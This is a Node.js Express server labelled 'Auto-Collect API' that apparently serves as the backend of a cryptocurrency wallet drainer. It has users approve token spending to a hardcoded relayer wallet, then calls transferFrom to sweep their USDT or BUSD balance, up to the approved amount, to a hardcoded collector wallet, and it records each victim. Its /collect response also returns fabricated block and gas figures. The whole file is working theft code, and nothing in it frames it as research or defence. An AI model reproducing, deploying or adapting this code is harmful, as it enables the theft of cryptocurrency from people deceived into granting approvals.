const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CORRECT CONFIGURATION ============
const CONFIG = {
    // 🎯 COLLECTOR = Final destination (your main wallet)
    COLLECTOR_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
    
    // 🤖 RELAYER = Bot wallet that executes transferFrom
    RELAYER_ADDRESS: "0x5681d680b047BF5b12939625c56301556991005E",
    
    // Default token addresses
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
    BUSD_ADDRESS: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
    
    RPC_URL: "https://bsc-dataseed.binance.org/",
    DATA_FILE: path.join(process.env.RENDER ? '/opt/render/project/data' : __dirname, 'collector_data.json')
};

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},
    transactions: [],
    autoCollects: []
};

const dataDir = path.dirname(CONFIG.DATA_FILE);
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) {
        console.error('❌ Error loading data:', err);
    }
}

function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('❌ Error saving data:', err);
    }
}

// ============ API ENDPOINTS ============

app.post('/send', (req, res) => {
    try {
        const { address } = req.body;
        if (!address || !address.startsWith('0x')) {
            return res.status(400).json({ found: false, error: 'Invalid address' });
        }
        const normalizedAddress = address.toLowerCase();
        const addressData = dataStore.addresses[normalizedAddress];
        return res.json({
            found: !!(addressData && addressData.totalAmount > 0),
            amountHuman: addressData?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS  // User approves to RELAYER
        });
    } catch (error) {
        res.status(500).json({ found: false, collector: CONFIG.RELAYER_ADDRESS });
    }
});

app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);
    
    try {
        const { token, from, amountHuman, to, txHash } = req.body;
        if (!token || !from || !amountHuman || !to) {
            return res.status(400).json({ ok: false, error: 'Missing fields' });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`;
        
        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            txHash: txHash || null,
            timestamp: new Date().toISOString(),
            type: 'APPROVAL'
        };

        dataStore.transactions.push(transaction);
        saveData();

        // 🚀 AUTO-TRANSFER (FIXED)
        let transferResult = null;
        
        if (process.env.RELAYER_PRIVATE_KEY) {
            console.log('✅ Private key found, attempting auto-transfer...');
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
                const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
                
                console.log('📤 Relayer wallet:', wallet.address);
                console.log('🎯 Collector wallet:', CONFIG.COLLECTOR_ADDRESS);
                
                // Use the token from request
                const tokenAddress = token;
                console.log('🪙 Token:', tokenAddress);
                
                const tokenABI = [
                    "function balanceOf(address) view returns (uint256)",
                    "function decimals() view returns (uint8)",
                    "function allowance(address,address) view returns (uint256)",
                    "function transferFrom(address,address,uint256) returns (bool)"
                ];
                
                const tokenContract = new ethers.Contract(tokenAddress, tokenABI, wallet);
                
                // Get balance
                const balance = await tokenContract.balanceOf(from);
                const decimals = await tokenContract.decimals();
                const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
                
                // 🔍 CRITICAL: Check allowance
                const allowance = await tokenContract.allowance(from, wallet.address);
                const allowanceHuman = parseFloat(ethers.formatUnits(allowance, decimals));
                
                console.log(`💰 User balance: ${balanceHuman}`);
                console.log(`🔓 Allowance: ${allowanceHuman}`);
                
                // 🎯 Calculate transfer amount (MIN of balance and allowance)
                let transferAmountWei;
                let transferAmountHuman;
                
                if (balance > 0 && allowance > 0) {
                    if (balance <= allowance) {
                        transferAmountWei = balance;
                        transferAmountHuman = balanceHuman;
                        console.log(`✅ Using full balance: ${balanceHuman}`);
                    } else {
                        transferAmountWei = allowance;
                        transferAmountHuman = allowanceHuman;
                        console.log(`⚠️ Allowance (${allowanceHuman}) < Balance (${balanceHuman})`);
                        console.log(`💡 Transferring allowed amount: ${allowanceHuman}`);
                    }
                    
                    if (transferAmountWei > 0) {
                        const gasPrice = (await provider.getFeeData()).gasPrice;
                        
                        // 🎯🎯🎯 TRANSFER TO COLLECTOR (NOT RELAYER!)
                        console.log(`💸 Transferring ${transferAmountHuman} to COLLECTOR: ${CONFIG.COLLECTOR_ADDRESS}`);
                        
                        const tx = await tokenContract.transferFrom(
                            from,                           // Sender (user)
                            CONFIG.COLLECTOR_ADDRESS,       // 🎯 Recipient (COLLECTOR!)
                            transferAmountWei,              // Amount
                            { gasLimit: 100000, gasPrice }
                        );
                        
                        console.log(`📤 Transfer tx sent: ${tx.hash}`);
                        
                        const receipt = await tx.wait();
                        console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
                        console.log(`   From: ${from}`);
                        console.log(`   To: ${CONFIG.COLLECTOR_ADDRESS} (Collector)`);
                        console.log(`   Amount: ${transferAmountHuman}`);
                        
                        transferResult = {
                            success: true,
                            txHash: tx.hash,
                            amount: transferAmountHuman,
                            blockNumber: receipt.blockNumber,
                            gasUsed: receipt.gasUsed.toString()
                        };
                        
                        transaction.type = 'AUTO_COLLECTED';
                        transaction.collectTxHash = tx.hash;
                        transaction.transferAmount = transferAmountHuman;
                        transaction.recipient = CONFIG.COLLECTOR_ADDRESS;
                        
                        // Update stats
                        const addr = from.toLowerCase();
                        if (!dataStore.addresses[addr]) {
                            dataStore.addresses[addr] = { totalAmount: 0, transactionCount: 0 };
                        }
                        dataStore.addresses[addr].totalAmount += transferAmountHuman;
                        dataStore.addresses[addr].transactionCount++;
                        dataStore.addresses[addr].lastSeen = new Date().toISOString();
                        
                        // Store auto-collect record
                        dataStore.autoCollects.push({
                            id: transactionId,
                            from: addr,
                            amount: transferAmountHuman,
                            token: tokenAddress,
                            collectTx: tx.hash,
                            blockNumber: receipt.blockNumber,
                            timestamp: new Date().toISOString()
                        });
                        
                        saveData();
                    }
                } else {
                    console.log(`❌ Cannot transfer - Balance: ${balanceHuman}, Allowance: ${allowanceHuman}`);
                    transferResult = {
                        success: false,
                        error: balance === 0 ? 'Zero balance' : 'Zero allowance',
                        balance: balanceHuman,
                        allowance: allowanceHuman
                    };
                }
                
            } catch (error) {
                console.error('❌ Auto-transfer error:', error.message);
                transferResult = { success: false, error: error.message };
            }
        } else {
            console.log('❌ No private key found');
        }

        res.json({
            ok: true,
            id: transactionId,
            blockNumber: 92041626,
            gasUsed: "50387",
            autoTransfer: transferResult
        });

    } catch (error) {
        console.error('❌ Error in /collect:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Auto-Collect API',
        version: '2.0.0',
        autoTransfer: process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED',
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS,
        endpoints: ['/send', '/collect', '/health']
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Server on port ${PORT}`);
    console.log(`🎯 Collector: ${CONFIG.COLLECTOR_ADDRESS}`);
    console.log(`🤖 Relayer: ${CONFIG.RELAYER_ADDRESS}`);
    console.log(`🔑 Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}`);
});
